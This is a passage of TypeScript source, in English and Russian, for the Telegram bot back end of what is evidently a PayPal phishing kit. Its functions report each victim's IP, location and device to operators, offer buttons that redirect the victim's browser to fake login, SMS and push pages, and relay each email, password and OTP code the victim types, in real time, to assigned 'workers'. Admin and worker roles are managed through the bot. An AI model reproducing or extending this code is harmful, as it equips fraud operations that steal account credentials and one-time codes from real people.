        country: data.country || "Unknown",
        city: data.city || "Unknown",
      };
    } else {
      return {
        country: "Unknown",
        city: "Unknown",
      };
    }
  } catch (error) {
    console.error("Error getting geolocation:", error);
    return {
      country: "Unknown",
      city: "Unknown",
    };
  }
}

// Notify about website visits with geolocation
export async function notifyVisit(
  page: string,
  ip: string,
  contextData: string,
  userAgent: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending visit notification - page: ${page}, context: ${contextData}`);
  console.log(`🔍 Bot initialized: ${!!bot}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  // Skip notifications for direct visits (no contextData)
  if (!contextData || contextData === "" || contextData === "undefined" || contextData === "null" || contextData === null) {
    console.log(`🚫 Skipping notification for direct visit (contextData: "${contextData}")`);
    return;
  }

  console.log(`✅ Proceeding with notification for contextData: ${contextData}`);

  try {
    // Force console output to be visible
    console.log("🔥 DEBUG: Starting notification processing...");
    console.log("🔥 DEBUG: Bot instance:", typeof bot);
    // Extract the first (real) IP address if multiple IPs are provided
    let displayIp = ip;
    if (ip.includes(",")) {
      displayIp = ip.split(",")[0].trim();
    }

    // Get geolocation data
    const location = await getGeolocation(ip);

    // Find link creator by contextData if provided
    let targetUsers = [];
    let linkCreatorId = null;

    console.log(`🔍 Looking for link with contextData: ${contextData}`);

    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      
      console.log(`🔍 Found ${links.length} links for contextData`);
      
      if (links.length > 0) {
        linkCreatorId = links[0].createdBy;
        console.log(`🔍 Link creator ID: ${linkCreatorId}`);
        
        const creatorUser = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreatorId));

        console.log(`🔍 Found ${creatorUser.length} creator users`);
        
        if (creatorUser.length > 0) {
          console.log(`🔍 Creator user role: ${creatorUser[0].role}`);
          console.log(`🔍 Creator user ID: ${creatorUser[0].telegramId}`);
          targetUsers.push({
            telegramId: linkCreatorId,
            uniqueId: creatorUser[0].uniqueId,
            linkId: links[0].linkId,
            role: creatorUser[0].role,
          });
          console.log(`✅ Added creator to targetUsers: ${creatorUser[0].uniqueId}`);
        }
      }
    }

    // Проверим, есть ли уже администратор (создатель ссылки) в targetUsers
    const adminInTargetUsers = targetUsers.find(u => u.role === "admin");
    
    if (!adminInTargetUsers) {
      // Если нет администратора в targetUsers, добавляем всех админов из config
      const adminIds = loadAdmins();
      console.log(`🔍 Loading admins from config: ${adminIds}`);
      
      // Добавляем админов (они видят все)
      for (const adminId of adminIds) {
        if (!targetUsers.some(u => u.telegramId === adminId)) {
          const user = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, adminId));
            
          if (user.length > 0) {
            targetUsers.push({
              telegramId: adminId,
              uniqueId: user[0].uniqueId,
              linkId: contextData ? targetUsers[0]?.linkId || "Unknown" : "Direct",
              role: user[0].role,
            });
            console.log(`✅ Added admin to targetUsers: ${user[0].uniqueId}`);
          } else {
            // Create dummy admin object for notification
            targetUsers.push({
              telegramId: adminId,
              uniqueId: `#ADMIN_${adminId}`,
              linkId: contextData ? targetUsers[0]?.linkId || "Unknown" : "Direct",
              role: "admin",
            });
            console.log(`✅ Added dummy admin to targetUsers: #ADMIN_${adminId}`);
          }
        }
      }
    } else {
      console.log(`🔑 Admin creator already in targetUsers, skipping other admins`);
    }

    // Если есть создатель ссылки и он НЕ администратор, найдем назначенных вбиверов
    if (linkCreatorId && !adminInTargetUsers) {
      const assignedWorkers = await getAssignedWorkers(linkCreatorId);
      
      for (const workerId of assignedWorkers) {
        const workerUser = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, workerId));
        
        if (workerUser.length > 0) {
          targetUsers.push({
            telegramId: workerId,
            uniqueId: workerUser[0].uniqueId,
            linkId: targetUsers[0]?.linkId || "Unknown",
            role: workerUser[0].role,
          });
        }
      }
      
      // Если нет назначенных вбиверов, используем круговую очередь
      if (assignedWorkers.length === 0) {
        const nextWorker = await getNextWorkerForAssignment();
        if (nextWorker) {
          const workerUser = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, nextWorker));
          
          if (workerUser.length > 0) {
            targetUsers.push({
              telegramId: nextWorker,
              uniqueId: workerUser[0].uniqueId,
              linkId: targetUsers[0]?.linkId || "Unknown",
              role: workerUser[0].role,
            });
          }
        }
      }
    } else if (adminInTargetUsers) {
      console.log(`🔑 Admin creator found, skipping worker assignment`);
    }

    // Store user activity for status checking
    if (contextData) {
      const activeUsers = (global as any).activeUsers || new Map();
      activeUsers.set(contextData, {
        timestamp: Date.now(),
        page: page,
        userAgent: userAgent,
        ip: displayIp,
      });
      (global as any).activeUsers = activeUsers;
    }

    const deviceInfo = parseUserAgent(userAgent);
    const countryFlag = getCountryFlag(location.country);
    const translatedPage = translatePageName(page);

    // Get link price for display
    let linkPrice = "0.00 EUR";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        // Replace localhost with actual domain
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://${await getCurrentDomain()}`,
        );
      }
    }

    const message =
      `🇩🇪 PAYPAL ${targetUsers[0]?.linkId || "#DIRECT"}\n` +
      `🧭 NEW log: ${translatedPage}\n` +
      `💰 ${linkPrice}\n\n` +
      `<a href="${actualLink}">🔗 Открыть ссылку</a>\n\n` +
      `🌐 IP: ${displayIp}\n` +
      `${countryFlag} Geo: ${location.country}, ${location.city}\n` +
      `💻 Info:\n` +
      `• Device: ${deviceInfo.device}\n` +
      `• Browser: ${deviceInfo.browser}\n` +
      `• OS: ${deviceInfo.os}`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData ? contextData.substring(0, 8) : "direct";

    // Store mapping of short hash to full contextData
    if (!(global as any).redirectHashMap) {
      (global as any).redirectHashMap = new Map();
    }
    if (contextData) {
      (global as any).redirectHashMap.set(shortHash, contextData);
    }

    // Store mapping for checker function
    if (!(global as any).checkHashMap) {
      (global as any).checkHashMap = new Map();
    }
    if (contextData) {
      (global as any).checkHashMap.set(shortHash, contextData);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "👁Чекер👁",
              callback_data: `check_users_${shortHash}`,
            },
          ],
          [
            {
              text: "➡️ Получить",
              callback_data: `redirect_${shortHash}_home`,
            },
            {
              text: "➡️ Логин",
              callback_data: `redirect_${shortHash}_signin`,
            },
          ],
          [
            {
              text: "➡️ Загрузка",
              callback_data: `redirect_${shortHash}_loading`,
            },
            {
              text: "➡️ Пуш",
              callback_data: `redirect_${shortHash}_sms_loading`,
            },
          ],
          [
            {
              text: "➡️ СМС",
              callback_data: `redirect_${shortHash}_sms`,
            },
            {
              text: "➡️ JaS 🕒",
              callback_data: `redirect_${shortHash}_fullscreen`,
            },
          ],
          [
            {
              text: "‼️Orig Paypal⁉️",
              callback_data: `redirect_${shortHash}_paypal`,
            },
          ],
          [
            {
              text: "🔄 Обновить",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    console.log(`🎯 Total target users: ${targetUsers.length}`);
    targetUsers.forEach((user, index) => {
      console.log(`  ${index + 1}. ${user.uniqueId} (${user.telegramId}) - Role: ${user.role}`);
    });
    
    for (const user of targetUsers) {
      try {
        console.log(`🔍 Processing user ${user.uniqueId} with role: ${user.role}`);
        if (user.role === "admin" || user.role === "worker") {
          console.log(`✅ Sending FULL notification to ${user.role} ${user.uniqueId}`);
          // Send full notification with location data and control buttons to admins/workers
          await sendWorkerNotification(user, user.linkId || "Unknown", message, keyboard);
        } else {
          console.log(`📝 Sending SIMPLE notification to user ${user.uniqueId}`);
          // Send simple notification to regular users
          const simpleAction = `Пользователь посетил: ${translatePageName(page)}`;
          await sendSimpleUserNotification(user, user.linkId || "Unknown", simpleAction, contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send visit notification to ${user.uniqueId}:`,
          error,
        );
      }
    }

    // Debug summary
    console.log(`🔍 Total notifications sent: ${targetUsers.length}`);
    console.log(`🔍 Admins/Workers: ${targetUsers.filter(u => u.role === "admin" || u.role === "worker").length}`);
    console.log(`🔍 Regular users: ${targetUsers.filter(u => u.role !== "admin" && u.role !== "worker").length}`);
  } catch (error) {
    console.error("Error sending visit notification:", error);
  }
}

// User Management System
async function showUserManagement(chatId: number, telegramId: string) {
  try {
    const allUsers = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt);
    const totalUsers = allUsers.length;
    const adminUsers = allUsers.filter(u => u.role === 'admin');
    const workerUsers = allUsers.filter(u => u.role === 'worker');
    const regularUsers = allUsers.filter(u => u.role === 'user');

    const message = 
      `👤 <b>Управление пользователями</b>\n\n` +
      `📊 <b>Статистика:</b>\n` +
      `• Всего пользователей: ${totalUsers}\n` +
      `• Администраторов: ${adminUsers.length}\n` +
      `• Вбиверов: ${workerUsers.length}\n` +
      `• Обычных пользователей: ${regularUsers.length}\n\n` +
      `Выберите действие:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "📋 Все", callback_data: "users_list_all" },
          { text: "👑 Админы", callback_data: "users_list_admin" },
        ],
        [
          { text: "🔨 Вбиверы", callback_data: "users_list_worker" },
          { text: "👥 Пользователи", callback_data: "users_list_user" },
        ],
        [
          { text: "➕ Добавить", callback_data: "user_add" },
          { text: "🗑️ Удалить", callback_data: "user_delete" },
        ],
        [
          { text: "⬆️ Повысить", callback_data: "user_promote_worker" },
          { text: "⬇️ Понизить", callback_data: "user_demote_user" },
        ],
        [
          { text: "🚫 Заблокировать", callback_data: "user_block" },
          { text: "✅ Разблокировать", callback_data: "user_unblock" },
        ],
        [
          { text: "🔄 Обновить", callback_data: "user_management_refresh" },
          { text: "🏠 Главное меню", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user management:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке управления пользователями.");
  }
}

// Show user list by role
async function showUserList(chatId: number, role: string = 'all', page: number = 1) {
  try {
    const pageSize = 5;
    const offset = (page - 1) * pageSize;
    
    let users;
    let totalUsers;
    let roleTitle;

    if (role === 'all') {
      users = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt).limit(pageSize).offset(offset);
      totalUsers = (await db.select().from(telegramUsers)).length;
      roleTitle = "Все пользователи";
    } else {
      users = await db.select().from(telegramUsers).where(eq(telegramUsers.role, role)).orderBy(telegramUsers.createdAt).limit(pageSize).offset(offset);
      totalUsers = (await db.select().from(telegramUsers).where(eq(telegramUsers.role, role))).length;
      roleTitle = role === 'admin' ? "Администраторы" : role === 'worker' ? "Вбиверы" : "Обычные пользователи";
    }

    const totalPages = Math.ceil(totalUsers / pageSize);

    let message = `👤 <b>${roleTitle}</b>\n\n`;
    
    if (users.length === 0) {
      message += "📭 Пользователи не найдены.";
    } else {
      users.forEach((user, index) => {
        const roleEmoji = user.role === 'admin' ? '👑' : user.role === 'worker' ? '🔨' : '👤';
        const status = user.approved ? '✅' : '❌';
        const createdDate = new Date(user.createdAt).toLocaleDateString('ru-RU');
        const username = user.username ? `@${user.username}` : 'Нет username';
        
        message += `${roleEmoji} <b>${user.uniqueId}</b>\n`;
        message += `• ID: <code>${user.telegramId}</code>\n`;
        message += `• Telegram: ${username}\n`;
        message += `• Роль: ${user.role}\n`;
        message += `• Статус: ${status}\n`;
        message += `• Создан: ${createdDate}\n\n`;
      });
    }

    message += `📄 Страница ${page} из ${totalPages} | Всего: ${totalUsers}`;

    const keyboard = {
      inline_keyboard: [
        // User action buttons
        users.length > 0 ? [
          { text: "✏️ Редактировать", callback_data: `user_edit_${role}_${page}` },
          { text: "🗑️ Удалить", callback_data: `user_delete_${role}_${page}` },
        ] : [],
        
        // Navigation buttons
        totalPages > 1 ? [
          ...(page > 1 ? [{ text: "⬅️ Назад", callback_data: `users_list_${role}_${page - 1}` }] : []),
          ...(page < totalPages ? [{ text: "➡️ Вперед", callback_data: `users_list_${role}_${page + 1}` }] : []),
        ] : [],
        
        // Back button
        [
          { text: "🔙 К управлению", callback_data: "manage_users" },
        ],
      ].filter(row => row.length > 0),
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user list:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке списка пользователей.");
  }
}

// User management action functions
async function showUserAddForm(chatId: number, telegramId: string) {
  try {
    const message = 
      `➕ <b>Добавить пользователя</b>\n\n` +
      `Введите Telegram ID пользователя для добавления в систему:\n\n` +
      `Пример: 123456789\n\n` +
      `Для отмены нажмите "Назад"`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });

    // Set user state for input
    userStates.set(telegramId, { action: "add_user" });
  } catch (error) {
    console.error("Error showing user add form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы добавления пользователя.");
  }
}

async function showUserDeleteForm(chatId: number, telegramId: string) {
  try {
    const allUsers = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt);
    
    if (allUsers.length === 0) {
      await bot.sendMessage(chatId, "📭 Нет пользователей для удаления.");
      return;
    }

    const message = 
      `🗑️ <b>Удалить пользователя</b>\n\n` +
      `Выберите пользователя для удаления:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...allUsers.map(user => [
          { 
            text: `🗑️ ${user.uniqueId} (@${user.username || 'нет username'})`, 
            callback_data: `delete_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user delete form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы удаления пользователя.");
  }
}

async function showUserPromoteForm(chatId: number, telegramId: string) {
  try {
    const regularUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.role, 'user'));
    
    if (regularUsers.length === 0) {
      await bot.sendMessage(chatId, "📭 Нет обычных пользователей для повышения.");
      return;
    }

    const message = 
      `⬆️ <b>Повысить до вбивера</b>\n\n` +
      `Выберите пользователя для повышения до роли вбивера:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...regularUsers.map(user => [
          { 
            text: `⬆️ ${user.uniqueId} (@${user.username || 'нет username'})`, 
            callback_data: `promote_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user promote form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы повышения пользователя.");
  }
}

async function showUserDemoteForm(chatId: number, telegramId: string) {
  try {
    const workerUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.role, 'worker'));
    
    if (workerUsers.length === 0) {
      await bot.sendMessage(chatId, "📭 Нет вбиверов для понижения.");
      return;
    }

    const message = 
      `⬇️ <b>Понизить до пользователя</b>\n\n` +
      `Выберите вбивера для понижения до роли пользователя:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...workerUsers.map(user => [
          { 
            text: `⬇️ ${user.uniqueId} (@${user.username || 'нет username'})`, 
            callback_data: `demote_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user demote form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы понижения пользователя.");
  }
}

async function showUserBlockForm(chatId: number, telegramId: string) {
  try {
    const activeUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    if (activeUsers.length === 0) {
      await bot.sendMessage(chatId, "📭 Нет активных пользователей для блокировки.");
      return;
    }

    const message = 
      `🚫 <b>Заблокировать пользователя</b>\n\n` +
      `Выберите пользователя для блокировки:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...activeUsers.map(user => [
          { 
            text: `🚫 ${user.uniqueId} (@${user.username || 'нет username'})`, 
            callback_data: `block_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user block form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы блокировки пользователя.");
  }
}

async function showUserUnblockForm(chatId: number, telegramId: string) {
  try {
    const blockedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, false));
    
    if (blockedUsers.length === 0) {
      await bot.sendMessage(chatId, "📭 Нет заблокированных пользователей для разблокировки.");
      return;
    }

    const message = 
      `✅ <b>Разблокировать пользователя</b>\n\n` +
      `Выберите пользователя для разблокировки:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...blockedUsers.map(user => [
          { 
            text: `✅ ${user.uniqueId} (@${user.username || 'нет username'})`, 
            callback_data: `unblock_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "🔙 Назад", callback_data: "manage_users" },
          { text: "❌ Отмена", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user unblock form:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при загрузке формы разблокировки пользователя.");
  }
}

// User action functions
async function addNewUser(chatId: number, telegramId: string, newUserId: string) {
  try {
    // Check if user already exists
    const existingUser = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, newUserId));
    
    if (existingUser.length > 0) {
      await bot.sendMessage(chatId, "❌ Пользователь уже существует в системе.");
      return;
    }

    // Generate unique ID for new user
    const uniqueId = generateUniqueId();
    
    // Create new user
    await db.insert(telegramUsers).values({
      telegramId: newUserId,
      uniqueId: uniqueId,
      role: 'user',
      isApproved: true,
      username: null,
      firstName: null,
      lastName: null,
      createdAt: new Date(),
    });
    
    await bot.sendMessage(chatId, 
      `✅ <b>Пользователь добавлен</b>\n\n` +
      `• Telegram ID: ${newUserId}\n` +
      `• Unique ID: ${uniqueId}\n` +
      `• Роль: user (обычный пользователь)\n` +
      `• Статус: активен\n\n` +
      `Пользователь добавлен в систему и может начать работу.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error adding new user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при добавлении пользователя.");
  }
}

async function deleteUser(chatId: number, telegramId: string, userToDeleteId: string) {
  try {
    const userToDelete = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToDeleteId));
    
    if (userToDelete.length === 0) {
      await bot.sendMessage(chatId, "❌ Пользователь не найден.");
      return;
    }

    const user = userToDelete[0];
    
    // Delete user from database
    await db.delete(telegramUsers).where(eq(telegramUsers.telegramId, userToDeleteId));
    
    // Delete user's links
    await db.delete(telegramLinks).where(eq(telegramLinks.createdBy, userToDeleteId));
    
    // Delete user's worker assignments (both as worker and as user)
    await db.delete(workerAssignments).where(eq(workerAssignments.workerId, userToDeleteId));
    await db.delete(workerAssignments).where(eq(workerAssignments.userId, userToDeleteId));
    
    await bot.sendMessage(chatId, 
      `✅ <b>Пользователь удален</b>\n\n` +
      `• ID: ${user.uniqueId}\n` +
      `• Telegram: @${user.username || 'нет username'}\n` +
      `• Роль: ${user.role}\n\n` +
      `Все данные пользователя удалены из системы.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error deleting user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при удалении пользователя.");
  }
}

async function promoteUser(chatId: number, telegramId: string, userToPromoteId: string) {
  try {
    const userToPromote = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToPromoteId));
    
    if (userToPromote.length === 0) {
      await bot.sendMessage(chatId, "❌ Пользователь не найден.");
      return;
    }

    const user = userToPromote[0];
    
    if (user.role !== 'user') {
      await bot.sendMessage(chatId, "❌ Пользователь не является обычным пользователем.");
      return;
    }
    
    // Update user role to worker
    await db.update(telegramUsers)
      .set({ role: 'worker' })
      .where(eq(telegramUsers.telegramId, userToPromoteId));
    
    await bot.sendMessage(chatId, 
      `✅ <b>Пользователь повышен</b>\n\n` +
      `• ID: ${user.uniqueId}\n` +
      `• Telegram: @${user.username || 'нет username'}\n` +
      `• Новая роль: worker (вбивер)\n\n` +
      `Пользователь теперь может получать уведомления с данными.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error promoting user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при повышении пользователя.");
  }
}

async function demoteUser(chatId: number, telegramId: string, userToDemoteId: string) {
  try {
    const userToDemote = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToDemoteId));
    
    if (userToDemote.length === 0) {
      await bot.sendMessage(chatId, "❌ Пользователь не найден.");
      return;
    }

    const user = userToDemote[0];
    
    if (user.role !== 'worker') {
      await bot.sendMessage(chatId, "❌ Пользователь не является вбивером.");
      return;
    }
    
    // Update user role to user
    await db.update(telegramUsers)
      .set({ role: 'user' })
      .where(eq(telegramUsers.telegramId, userToDemoteId));
    
    // Remove all worker assignments
    await db.delete(workerAssignments).where(eq(workerAssignments.workerId, userToDemoteId));
    
    await bot.sendMessage(chatId, 
      `✅ <b>Пользователь понижен</b>\n\n` +
      `• ID: ${user.uniqueId}\n` +
      `• Telegram: @${user.username || 'нет username'}\n` +
      `• Новая роль: user (обычный пользователь)\n\n` +
      `Пользователь больше не получает уведомления с данными.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error demoting user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при понижении пользователя.");
  }
}

async function blockUser(chatId: number, telegramId: string, userToBlockId: string) {
  try {
    const userToBlock = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToBlockId));
    
    if (userToBlock.length === 0) {
      await bot.sendMessage(chatId, "❌ Пользователь не найден.");
      return;
    }

    const user = userToBlock[0];
    
    if (!user.isApproved) {
      await bot.sendMessage(chatId, "❌ Пользователь уже заблокирован.");
      return;
    }
    
    // Block user
    await db.update(telegramUsers)
      .set({ isApproved: false })
      .where(eq(telegramUsers.telegramId, userToBlockId));
    
    await bot.sendMessage(chatId, 
      `🚫 <b>Пользователь заблокирован</b>\n\n` +
      `• ID: ${user.uniqueId}\n` +
      `• Telegram: @${user.username || 'нет username'}\n` +
      `• Роль: ${user.role}\n\n` +
      `Пользователь заблокирован и не может пользоваться системой.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error blocking user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при блокировке пользователя.");
  }
}

async function unblockUser(chatId: number, telegramId: string, userToUnblockId: string) {
  try {
    const userToUnblock = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToUnblockId));
    
    if (userToUnblock.length === 0) {
      await bot.sendMessage(chatId, "❌ Пользователь не найден.");
      return;
    }

    const user = userToUnblock[0];
    
    if (user.isApproved) {
      await bot.sendMessage(chatId, "❌ Пользователь уже разблокирован.");
      return;
    }
    
    // Unblock user
    await db.update(telegramUsers)
      .set({ isApproved: true })
      .where(eq(telegramUsers.telegramId, userToUnblockId));
    
    await bot.sendMessage(chatId, 
      `✅ <b>Пользователь разблокирован</b>\n\n` +
      `• ID: ${user.uniqueId}\n` +
      `• Telegram: @${user.username || 'нет username'}\n` +
      `• Роль: ${user.role}\n\n` +
      `Пользователь разблокирован и может пользоваться системой.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error unblocking user:", error);
    await bot.sendMessage(chatId, "❌ Ошибка при разблокировке пользователя.");
  }
}

// Diagnostic function to test notification system
export async function testNotificationSystem() {
  console.log("🔥 TESTING NOTIFICATION SYSTEM");
  console.log("🔥 Bot instance:", typeof bot);
  console.log("🔥 Bot polling status:", bot?.isPolling?.() || "unknown");
  
  // Test admin user lookup
  const adminUsers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "admin"));
  console.log("🔥 Admin users found:", adminUsers.length);
  
  // Test worker user lookup
  const workerUsers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "worker"));
  console.log("🔥 Worker users found:", workerUsers.length);
  
  // Test direct message send
  try {
    if (bot && adminUsers.length > 0) {
      console.log("🔥 Testing direct message to admin...");
      await bot.sendMessage(adminUsers[0].telegramId, "🔥 Test message from notification system");
      console.log("🔥 Direct message sent successfully");
    }
  } catch (error) {
    console.error("🔥 Direct message failed:", error);
  }
}

// Notify about field input in real-time
export async function notifyFieldInput(
  field: string,
  value: string,
  returnUri: string,
  contextData: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending field input notification - field: ${field}, context: ${contextData}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find link creator by contextData
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.contextData, contextData));
    console.log(`🔍 Found links for field input notification: ${links.length}`);

    if (links.length === 0) {
      console.log(
        "⚠️ No links found for contextData, no field notification sent",
      );
      return;
    }

    const linkCreatorId = links[0].createdBy;
    const creatorUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, linkCreatorId));

    if (creatorUser.length === 0) {
      console.log("⚠️ Link creator not found in database");
      return;
    }

    // Get target users using worker assignment system
    let targetUsers: any[] = [];
    
    // Check if creator is admin - if so, they see all notifications
    if (creatorUser[0].role === "admin") {
      targetUsers = creatorUser;
      console.log("🔑 Admin user - sending field notification to admin");
    } else {
      // Check if creator is regular user with assigned workers
      const assignedWorkers = await db
        .select()
        .from(workerAssignments)
        .leftJoin(telegramUsers, eq(workerAssignments.workerId, telegramUsers.telegramId))
        .where(eq(workerAssignments.userId, linkCreatorId));

      if (assignedWorkers.length > 0) {
        // Send to assigned workers
        targetUsers = assignedWorkers.map(assignment => assignment.telegramUsers).filter(Boolean);
        console.log(`👥 Found ${targetUsers.length} assigned workers for field notification`);
      } else {
        // No assigned workers, assign to next available worker using round-robin
        const nextWorker = await getNextWorkerForAssignment();
        if (nextWorker) {
          // Create automatic assignment
          await db.insert(workerAssignments).values({
            workerId: nextWorker,
            userId: linkCreatorId,
            assignedBy: "system",
          });

          console.log(`✅ Auto-assigned worker ${nextWorker} to user ${linkCreatorId}`);
          
          // Get worker info
          const workerUser = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, nextWorker));
          
          targetUsers = workerUser;
          console.log("🤖 Auto-assigned to worker for field notification");
        } else {
          // No workers available, send to admins
          const adminIds = loadAdmins();
          const adminUsers = [];
          for (const adminId of adminIds) {
            const user = await db
              .select()
              .from(telegramUsers)
              .where(eq(telegramUsers.telegramId, adminId));
              
            if (user.length > 0) {
              adminUsers.push(user[0]);
            } else {
              // Create dummy admin object for notification
              adminUsers.push({
                telegramId: adminId,
                uniqueId: `#ADMIN_${adminId}`,
                role: "admin",
                isApproved: true
              });
            }
          }
          
          targetUsers = adminUsers;
          console.log("🔑 No workers available - sending field notification to admins");
        }
      }
    }

    if (targetUsers.length === 0) {
      console.log("⚠️ No target users found for field notification");
      return;
    }

    const fieldName =
      field === "email"
        ? "E-Mail"
        : field === "password"
          ? "Пароль"
          : "OTP Код";
    const pageName = field === "otp" ? "Пуш & Смс" : "Ввод данных";

    // Get actual generated link from database
    let actualLink = links[0].generatedLink || "https://paypal.com";
    if (actualLink.includes("localhost:5000")) {
      actualLink = actualLink.replace(
        "http://localhost:5000",
        `https://${await getCurrentDomain()}`,
      );
    }

    const fullMessage =
      `🇩🇪 PAYPAL ${links[0].linkId}\n\n` +
      `📝 <b>Поле:</b> ${fieldName}\n` +
      `💾 <b>Значение:</b> <code>${value}</code>`;

    // Create keyboard with refresh button
    const shortHash = contextData.substring(0, 8);
    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🔄 Обновить",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with sensitive data to admins/workers
          await bot.sendMessage(user.telegramId, fullMessage, { 
            parse_mode: "HTML",
            ...keyboard
          });
          console.log(`✅ Full field input notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification without sensitive data to regular users
          const simpleAction = field === "otp" ? "Пользователь вводит SMS код" : "Пользователь вводит данные";
          await sendSimpleUserNotification(user, links[0].linkId, simpleAction, contextData);
        }
